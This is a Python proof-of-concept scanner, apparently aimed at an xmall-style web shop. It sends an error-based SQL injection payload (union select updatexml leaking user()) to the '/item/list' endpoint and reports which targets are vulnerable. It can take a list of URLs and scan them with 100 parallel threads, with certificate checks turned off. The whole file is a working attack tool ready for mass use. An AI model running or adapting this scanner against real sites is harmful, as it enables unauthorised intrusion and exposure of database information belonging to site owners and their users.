import argparse,sys,requests,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def main():
    """主函数"""
    banner()
    parser = argparse.ArgumentParser(description="这是脚本的提示信息")
    parser.add_argument('-u','--url',type=str,help='请输入你的url')
    parser.add_argument('-f','--file',type=str,help='请输入文件名')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
def banner():
    banner = """
▐▄• ▄ • ▌ ▄ ·.  ▄▄▄· ▄▄▌  ▄▄▌      .▄▄ · .▄▄▄  ▄▄▌  
 █▌█▌▪·██ ▐███▪▐█ ▀█ ██•  ██•      ▐█ ▀. ▐▀•▀█ ██•  
 ·██· ▐█ ▌▐▌▐█·▄█▀▀█ ██▪  ██▪      ▄▀▀▀█▄█▌·.█▌██▪  
▪▐█·█▌██ ██▌▐█▌▐█ ▪▐▌▐█▌▐▌▐█▌▐▌    ▐█▄▪▐█▐█▪▄█·▐█▌▐▌
•▀▀ ▀▀▀▀  █▪▀▀▀ ▀  ▀ .▀▀▀ .▀▀▀      ▀▀▀▀ ·▀▀█. .▀▀▀ 
                                    
                                author:heichao
                                version:1.0.0
"""
    print(banner)
def poc(target):
    url = target + "/item/list?draw=1&order%5B0%5D%5Bcolumn%5D=1&order%5B0%5D%5Bdir%5D=desc)a+union+select+updatexml(1,concat(0x7e,user(),0x7e),1)%23;&start=0&length=1&search%5Bvalue%5D=&search%5Bregex%5D=false&cid=-1&_=1679041197136 "
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
        'Te': 'trailers'
    }
    try:
        response = requests.get(url=url,headers=headers,verify=False).text
        if 'database' in response:
            print(f"[+]{target}有SQL注入漏洞")
        else:
            print(f"[-]{target} none")
    except:
        print(f"[*]{target} sever error")

if __name__ == '__main__':
    main()